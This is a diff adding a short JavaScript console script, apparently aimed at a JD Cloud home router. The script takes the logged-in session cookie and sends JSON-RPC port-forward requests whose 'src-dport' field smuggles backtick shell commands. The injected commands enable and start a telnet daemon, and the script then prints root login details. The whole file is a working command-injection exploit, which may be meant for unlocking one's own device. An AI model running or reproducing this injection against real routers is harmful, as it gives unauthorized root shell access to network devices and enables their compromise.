@@ -1,0 +1,55 @@
+(async () => {
+    const session = document.cookie.split('; ').find(r => r.startsWith('sessionid='))?.split('=')[1];
+    
+    if (!session) {
+        console.error('❌ 未登录，请先登录 http://192.168.68.1');
+        return;
+    }
+
+    const exec = async (cmd) => {
+        console.log(`📌 执行: ${cmd}`);
+
+        try {
+            await fetch('/jdcapi', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    jsonrpc: '2.0',
+                    id: 1,
+                    method: 'call',
+                    params: [session, 'jdcapi.static', 'set_port_forward', {
+                        'on-off': 1,
+                        name: 't1',
+                        proto: 'TCP',
+                        'src-dport': `1234;\`${cmd}\``,
+                        ipaddr: '192.168.1.100',
+                        'dest-port': '80',
+                        edit: 1
+                    }]
+                })
+            });
+            console.log(`✅ ${cmd} 注入成功`);
+            return true;
+        } catch (e) {
+            console.error(`❌ ${cmd} 执行失败`, e);
+            return false;
+        }
+    };
+
+    console.log('🚀 开始尝试开启 Telnet...\n');
+
+    const s1 = await exec('factory_hm info telnet 1');
+    const s2 = await exec('telnetd');
+
+    if (s1 && s2) {
+        console.log('\n🎉 Telnet 已经成功开启！');
+        console.log('━━━━━━━━━━━━━━━━━━━━━━');
+        console.log('   地址：192.168.68.1');
+        console.log('   用户名：root');
+        console.log('   密码：路由器后台管理密码');
+        console.log('━━━━━━━━━━━━━━━━━━━━━━');
+        console.log('请用 Telnet 客户端连接测试（PuTTY / FinalShell / 终端命令行）');
+    } else {
+        console.error('\n⚠️ ');
+    }
+})();
